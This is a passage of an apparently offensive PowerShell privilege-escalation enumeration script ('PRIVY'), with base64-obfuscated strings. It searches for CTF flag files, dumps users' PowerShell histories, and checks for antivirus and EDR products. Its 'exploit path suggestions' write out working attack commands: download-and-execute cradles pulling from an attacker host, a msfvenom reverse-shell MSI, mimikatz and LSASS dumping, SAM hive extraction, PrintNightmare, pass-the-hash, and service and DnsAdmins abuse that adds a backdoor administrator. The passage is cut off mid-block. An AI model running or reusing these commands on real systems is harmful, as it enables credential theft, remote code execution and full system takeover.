Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcCAmIERvY3VtZW50cw=='))) $fs
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VXNlciBEZXNrdG9w'))) { Get-ChildItem ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXERlc2t0b3A=')))) -Force -ErrorAction SilentlyContinue | Format-Table -AutoSize } $fs
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VXNlciBEb2N1bWVudHM='))) { Get-ChildItem ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXERvY3VtZW50cw==')))) -Force -ErrorAction SilentlyContinue | Format-Table -AutoSize } $fs
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHVibGljIERlc2t0b3A='))) { Get-ChildItem ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnNcUHVibGljXERlc2t0b3A='))) -Force -ErrorAction SilentlyContinue | Format-Table -AutoSize } $fs

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmxhZyBMb2NhdGlvbnMgKENURik='))) $fs
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VhcmNoIGZvciBmbGFncw=='))) {
    $flagPaths = @(
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0'))),
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXGZsYWcudHh0'))),
        (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnNc'))) + $env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJOQU1FXERlc2t0b3BcdXNlci50eHQ=')))),
        (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnNc'))) + $env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJOQU1FXERlc2t0b3BcZmxhZy50eHQ=')))),
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnNcUHVibGljXERlc2t0b3Bccm9vdC50eHQ='))),
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Qzpccm9vdC50eHQ='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcZmxhZy50eHQ=')))
    )
    foreach ($fp in $flagPaths) { if (Test-Path $fp) { (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Rk9VTkQ6IA=='))) + $fp); Get-Content $fp } }
} $fs

Separator $fs
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFt2XSBTYXZlZCAtPiA='))) + $fs + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) -ForegroundColor Green

# ============================================================================
#  10. HISTORIES
# ============================================================================
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQSEFTRSAxMDogSElTVE9SSUVT'))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Magenta

'' | Out-File $history -Encoding UTF8
Section-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SGlzdG9yaWVz'))) $history

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG93ZXJTaGVsbCBIaXN0b3J5IChhbGwgdXNlcnMp'))) $history
Get-ChildItem ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnM='))) -ErrorAction SilentlyContinue | ForEach-Object {
    $hist = ($($_.FullName) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xQb3dlclNoZWxsXFBTUmVhZExpbmVcQ29uc29sZUhvc3RfaGlzdG9yeS50eHQ='))))
    if (Test-Path $hist) {
        Run-Cmd (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UFNSZWFkTGluZTog'))) + $($_.Name)) { Get-Content $hist } $history
        Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG93ZXJTaGVsbCBoaXN0b3J5IGZvdW5kIGZvciB1c2VyOiA='))) + $($_.Name)) $history
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Y21kLmV4ZSBIaXN0b3J5IChkb3NrZXkp'))) $history
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZG9za2V5IC9oaXN0b3J5'))) { doskey /history } $history

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UmVjZW50IEZpbGVz'))) $history
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UmVjZW50'))) { Get-ChildItem ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcUmVjZW50')))) -ErrorAction SilentlyContinue | Format-Table Name,LastWriteTime -AutoSize | Select-Object -First 30 } $history

Separator $history
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFt2XSBTYXZlZCAtPiA='))) + $history + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) -ForegroundColor Green

# ============================================================================
#  11. DEV TOOLS & TRANSFER VECTORS
# ============================================================================
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQSEFTRSAxMTogREVWIFRPT0xTICYgVFJBTlNGRVIgVkVDVE9SUw=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Magenta

'' | Out-File $devtools -Encoding UTF8
Section-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGV2IFRvb2xzICYgVHJhbnNmZXIgVmVjdG9ycw=='))) $devtools

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TGFuZ3VhZ2VzICYgUnVudGltZXM='))) $devtools
$tools = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cHl0aG9u'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cHl0aG9uMw=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cnVieQ=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cGVybA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bm9kZQ=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('amF2YQ=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cGhw'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Z28='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Z2Nj'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cHdzaA=='))))
foreach ($t in $tools) {
    $loc = Get-Command $t -ErrorAction SilentlyContinue
    if ($loc) {
        Add-Content $devtools (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbRk9VTkRdIA=='))) + $t + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0+IA=='))) + $($loc.Source))
        Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFsrXSA='))) + $t + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0+IA=='))) + $($loc.Source)) -ForegroundColor Green
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmlsZSBUcmFuc2ZlciBUb29scw=='))) $devtools
$xferTools = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Y3VybA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2dldA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Y2VydHV0aWw='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Yml0c2FkbWlu'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZnRw'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dGZ0cA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmM='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmNhdA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('c2Nw'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2dldA=='))))
foreach ($t in $xferTools) {
    $loc = Get-Command $t -ErrorAction SilentlyContinue
    if ($loc) {
        Add-Content $devtools (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbRk9VTkRdIA=='))) + $t + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0+IA=='))) + $($loc.Source))
        Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFsrXSA='))) + $t + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0+IA=='))) + $($loc.Source)) -ForegroundColor Green
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG93ZXJTaGVsbCBEb3dubG9hZCBDcmFkbGVzIEF2YWlsYWJsZQ=='))) $devtools
Add-Content $devtools @"

  Transfer from attacker:
  IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/shell.ps1')
  Invoke-WebRequest -Uri 'http://<attacker>/file.exe' -OutFile 'C:\Temp\file.exe'
  certutil -urlcache -split -f 'http://<attacker>/file.exe' file.exe
  bitsadmin /transfer job /download /priority normal http://<attacker>/file.exe C:\Temp\file.exe
"@

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QVYgLyBFRFIgRGV0ZWN0aW9u'))) $devtools
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVmZW5kZXIgc3RhdHVz'))) { Get-MpComputerStatus | Select-Object AMRunningMode,AntivirusEnabled,RealTimeProtectionEnabled | Format-List } $devtools
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VGFza2xpc3QgQVYgY2hlY2s='))) { tasklist | Select-String -Pattern ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZGVmZW5kZXJ8YXZnfGF2YXN0fG1jYWZlZXxzZW50aW5lbHxjcm93ZHxjYXJib258Y3lsYW5jZXxzeW1hbnRlY3xzb3Bob3N8ZXNldHxiaXRkZWZlbmRlcnxrYXNwZXJza3k='))) -CaseSensitive:$false } $devtools

Separator $devtools
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFt2XSBTYXZlZCAtPiA='))) + $devtools + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) -ForegroundColor Green

# ============================================================================
#  12. EXPLOIT PATH SUGGESTIONS
# ============================================================================
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQSEFTRSAxMjogRVhQTE9JVCBQQVRIIFNVR0dFU1RJT05T'))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Magenta

@"
======================================================================
  PRIVY -- EXPLOIT PATH SUGGESTIONS
  Generated: $(Get-Date)
  Host: $env:COMPUTERNAME | User: $env:USERNAME
======================================================================

  Priority key:
  [P1] Immediate -- run it now
  [P2] Likely SYSTEM -- needs a step or two
  [P3] Investigate -- depends on context

======================================================================

"@ | Out-File $exploit -Encoding UTF8

# -- P1: SeImpersonatePrivilege --------------------------------------------
if ($whoamiPriv -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VJbXBlcnNvbmF0ZVByaXZpbGVnZS4qRW5hYmxlZA==')))) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VJbXBlcnNvbmF0ZVByaXZpbGVnZSBFTkFCTEVE'))) @"
  PrintSpoofer (Windows 10/Server 2019+):
    .\PrintSpoofer.exe -i -c cmd
    https://github.com/itm4n/PrintSpoofer

  GodPotato (universal):
    .\GodPotato.exe -cmd "cmd /c whoami"
    https://github.com/BeichenDream/GodPotato

  JuicyPotatoNG:
    .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe"
    https://github.com/antonioCoco/JuicyPotatoNG
"@
}

# -- P1: SeBackupPrivilege -------------------------------------------------
if ($whoamiPriv -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VCYWNrdXBQcml2aWxlZ2UuKkVuYWJsZWQ=')))) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VCYWNrdXBQcml2aWxlZ2UgRU5BQkxFRCAtLSBkdW1wIFNBTS9TWVNURU0='))) @"
  Copy SAM and SYSTEM hives (bypass ACL with robocopy or reg save):
    reg save HKLM\SAM C:\Temp\SAM
    reg save HKLM\SYSTEM C:\Temp\SYSTEM
    reg save HKLM\SECURITY C:\Temp\SECURITY
  Transfer to attacker and extract:
    python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
  Or with Evil-WinRM SeBackupPrivilege abuse:
    https://github.com/mpgn/BackupOperatorToDA
"@
}

# -- P1: SeDebugPrivilege --------------------------------------------------
if ($whoamiPriv -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VEZWJ1Z1ByaXZpbGVnZS4qRW5hYmxlZA==')))) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VEZWJ1Z1ByaXZpbGVnZSBFTkFCTEVEIC0tIExTQVNTIGR1bXA='))) @"
  Dump LSASS with Task Manager (if GUI) or:
    .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
  Or via procdump:
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
  Transfer dump and parse offline:
    python3 pypykatz lsa minidump lsass.dmp
"@
}

# -- P1: SeRestorePrivilege ------------------------------------------------
if ($whoamiPriv -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VSZXN0b3JlUHJpdmlsZWdlLipFbmFibGVk')))) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VSZXN0b3JlUHJpdmlsZWdlIEVOQUJMRUQgLS0gYXJiaXRyYXJ5IGZpbGUgd3JpdGU='))) @"
  Pair with SeBackup to overwrite system files. Or hijack a service binary:
    1. Take ownership of target binary (with SeTakeOwnership) or use built-in restore.
    2. Replace C:\Program Files\<svc>\service.exe with a payload.
    3. Restart the service: sc stop <svc> && sc start <svc>
  Reference: https://github.com/giuliano108/SeBackupPrivilege
"@
}

# -- P1: SeTakeOwnershipPrivilege ------------------------------------------
if ($whoamiPriv -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VUYWtlT3duZXJzaGlwUHJpdmlsZWdlLipFbmFibGVk')))) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VUYWtlT3duZXJzaGlwUHJpdmlsZWdlIEVOQUJMRUQgLS0gb3duIGFueSBmaWxl'))) @"
  Take ownership of SAM/SYSTEM hives or a service binary:
    takeown /f C:\Windows\System32\config\SAM
    icacls C:\Windows\System32\config\SAM /grant <user>:F
  Then read or replace. Combine with SeRestore for end-to-end overwrite.
"@
}

# -- P1: SeLoadDriverPrivilege ---------------------------------------------
if ($whoamiPriv -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VMb2FkRHJpdmVyUHJpdmlsZWdlLipFbmFibGVk')))) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VMb2FkRHJpdmVyUHJpdmlsZWdlIEVOQUJMRUQgLS0ga2VybmVsIGNvZGUgZXhlY3V0aW9u'))) @"
  Load a vulnerable signed driver (BYOVD) for kernel-level RCE:
    https://github.com/TarlogicSecurity/EoPLoadDriver
    https://github.com/Cn33liz/EoPLoadDriver
  Common BYOVD targets: Capcom.sys, dbutil_2_3.sys, RTCore64.sys
  Reference: https://www.loldrivers.io/
"@
}

# -- P1: SeAssignPrimaryTokenPrivilege -------------------------------------
if ($whoamiPriv -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VBc3NpZ25QcmltYXJ5VG9rZW5Qcml2aWxlZ2UuKkVuYWJsZWQ=')))) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VBc3NpZ25QcmltYXJ5VG9rZW5Qcml2aWxlZ2UgRU5BQkxFRCAtLSB0b2tlbiBpbXBlcnNvbmF0aW9u'))) @"
  Same potato attack family as SeImpersonate:
    .\GodPotato.exe -cmd "cmd /c whoami"
    .\PrintSpoofer.exe -i -c cmd
"@
}

# -- P2: SeManageVolumePrivilege -------------------------------------------
if ($whoamiPriv -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VNYW5hZ2VWb2x1bWVQcml2aWxlZ2UuKkVuYWJsZWQ=')))) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDI='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VNYW5hZ2VWb2x1bWVQcml2aWxlZ2UgRU5BQkxFRCAtLSB3cml0ZSB0byBTeXN0ZW0zMg=='))) @"
  Grants FullControl on entire C:\ drive:
    https://github.com/CsEnox/SeManageVolumeExploit
    .\SeManageVolumeExploit.exe
  Then drop a DLL into System32 that a SYSTEM process loads (DLL hijack).
"@
}

# -- P1: AlwaysInstallElevated ---------------------------------------------
if ($aieHKLM -eq 1 -and $aieHKCU -eq 1) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWx3YXlzSW5zdGFsbEVsZXZhdGVkIC0tIE1TSSBydW5zIGFzIFNZU1RFTQ=='))) @"
  Generate payload:
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f msi -o shell.msi
  Execute on target:
    msiexec /quiet /qn /i shell.msi
"@
}

# -- P1: AutoLogon credentials ---------------------------------------------
if ($winlogon.DefaultPassword) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QXV0b0xvZ29uIGNyZWRlbnRpYWxzIGluIHJlZ2lzdHJ5'))) @"
  Username: $($winlogon.DefaultUserName)
  Password: $($winlogon.DefaultPassword)
  Try: runas /user:$($winlogon.DefaultUserName) cmd
  Or authenticate via Evil-WinRM / SMB / RDP with these credentials.
"@
}

# -- P1: cmdkey saved credentials ------------------------------------------
if ($cmdkeyResult -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VGFyZ2V0Og==')))) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2F2ZWQgY3JlZGVudGlhbHMgdmlhIGNtZGtleQ=='))) @"
  List saved creds: cmdkey /list
  Use saved cred:   runas /savecred /user:<domain\user> "cmd /c <command>"
  E.g.:             runas /savecred /user:Administrator "cmd /c whoami > C:\Temp\out.txt"
"@
}

# -- P2: Unquoted service paths --------------------------------------------
if ($unquoted.Count -gt 0) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDI='))) (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW5xdW90ZWQgc2VydmljZSBwYXRoKHMpIGZvdW5kICg='))) + $($unquoted.Count) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KQ==')))) @"
  For a path like: C:\Program Files\My App\service.exe
  Plant payload at: C:\Program.exe or C:\Program Files\My.exe
  Then restart the service: sc stop <svc> && sc start <svc>
  Or wait for reboot if restart requires elevation.
  Paths found:
$(($unquoted | ForEach-Object { "    -> $_" }) -join "`n")
"@
}

# -- P2: PrintNightmare check ----------------------------------------------
$spoolerRunning = Get-Service Spooler -ErrorAction SilentlyContinue
$osBuild = [System.Environment]::OSVersion.Version.Build
if ($spoolerRunning.Status -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UnVubmluZw==')))) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDI='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHJpbnQgU3Bvb2xlciBpcyBydW5uaW5nIC0tIGNoZWNrIGZvciBQcmludE5pZ2h0bWFyZSAoQ1ZFLTIwMjEtMTY3NSAvIENWRS0yMDIxLTM0NTI3KQ=='))) @"
  Check if patched: Get-HotFix KB5004945, KB5004946, KB5004947, KB5004948, KB5004960
  If unpatched:
    https://github.com/cube0x0/CVE-2021-1675
    python3 CVE-2021-1675.py <domain>/<user>:<pass>@<target> '\\<attacker>\share\evil.dll'
  Or PowerShell:
    Import-Module .\CVE-2021-1675.ps1
    Invoke-Nightmare -NewUser "hacker" -NewPassword "Pass123!" -DriverName "PrintMe"
"@
}

# -- P2: LocalAccountTokenFilterPolicy ------------------------------------
if ($uac.LocalAccountTokenFilterPolicy -eq 1) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDI='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k9MSAtLSBQVEggb3ZlciBuZXR3b3JrIGVuYWJsZWQ='))) @"
  Pass-the-Hash with local admin credentials:
    evil-winrm -i <target> -u Administrator -H <NTLM_hash>
    nxc smb <target> -u Administrator -H <NTLM_hash> -x "whoami"
    impacket-psexec Administrator@<target> -hashes :<NTLM_hash>
"@
}

# -- P1: HiveNightmare / SeriousSAM ----------------------------------------
if ($hiveNightmare) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SGl2ZU5pZ2h0bWFyZSAoQ1ZFLTIwMjEtMzY5MzQpIC0tIFNBTS9TWVNURU0vU0VDVVJJVFkgcmVhZGFibGUgYnkgVXNlcnM='))) @"
  Dump hives from a VSS shadow copy (which inherits the bad ACL):
    vssadmin list shadows
    # Read SAM/SYSTEM/SECURITY from \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\System32\config\
  Or use HiveNightmare PoC:
    https://github.com/GossiTheDog/HiveNightmare
    .\HiveNightmare.exe
  Then offline:
    python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
"@
}

# -- P1: GPP cPassword -----------------------------------------------------
if ($gppFound) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R1BQIGNQYXNzd29yZCAoQ1ZFLTIwMTQtMTgxMikgZm91bmQgaW4gR3JvdXAgUG9saWN5IFhNTA=='))) @"
  Microsoft published the AES key, so cpasswords are trivially decryptable:
    gpp-decrypt '<base64_cpassword>'
  Or with PowerShell:
    https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
    Get-GPPPassword
  Credentials are usually domain accounts -- try them broadly with nxc.
"@
}

# -- P1: High-privilege group memberships ----------------------------------
foreach ($g in $privGroupHits) {
    switch -Regex ($g) {
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QmFja3VwIE9wZXJhdG9ycw=='))) {
            Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TWVtYmVyIG9mOiBCYWNrdXAgT3BlcmF0b3Jz'))) @"
  Read SAM/SYSTEM hives via reg save (SeBackupPrivilege is implicit):
    reg save HKLM\SAM C:\Temp\SAM
    reg save HKLM\SYSTEM C:\Temp\SYSTEM
  Extract offline: secretsdump.py -sam SAM -system SYSTEM LOCAL
  On a DC: https://github.com/mpgn/BackupOperatorToDA
"@
        }
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VydmVyIE9wZXJhdG9ycw=='))) {
            Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TWVtYmVyIG9mOiBTZXJ2ZXIgT3BlcmF0b3Jz'))) @"
  Modify any service binary path to your payload, then start it as SYSTEM:
    sc config <svc> binPath= "cmd /c net user hacker P@ssw0rd /add && net localgroup Administrators hacker /add"
    sc start <svc>
"@
        }
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RG5zQWRtaW5z'))) {
            Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TWVtYmVyIG9mOiBEbnNBZG1pbnMgKGxpa2VseSBvbiBEQyk='))) @"
  Load arbitrary DLL into the DNS service (runs as SYSTEM on the DC):
    msfvenom -p windows/x64/exec CMD='net user hacker P@ssw0rd /add' -f dll -o evil.dll
    Place evil.dll on a share readable by the DC.
    dnscmd <dc> /config /serverlevelplugindll \\<attacker>\share\evil.dll
    sc \\<dc> stop dns && sc \\<dc> start dns
"@
        }
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SHlwZXItViBBZG1pbmlzdHJhdG9ycw=='))) {
            Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDI='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TWVtYmVyIG9mOiBIeXBlci1WIEFkbWluaXN0cmF0b3Jz'))) @"
  Mount VHDX of a VM containing creds, or attach a malicious VHD.
  Research path; less canned exploit than other groups.
"@
        }
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHJpbnQgT3BlcmF0b3Jz'))) {
            Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDI='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TWVtYmVyIG9mOiBQcmludCBPcGVyYXRvcnM='))) @"
  Can load printer drivers (SeLoadDriverPrivilege effectively):
    Check BYOVD path: https://github.com/TarlogicSecurity/EoPLoadDriver
"@
        }
    }
}

# -- P2: Writable service directory (DLL hijack) --------------------------
if ($writableSvcDirs.Count -gt 0) {
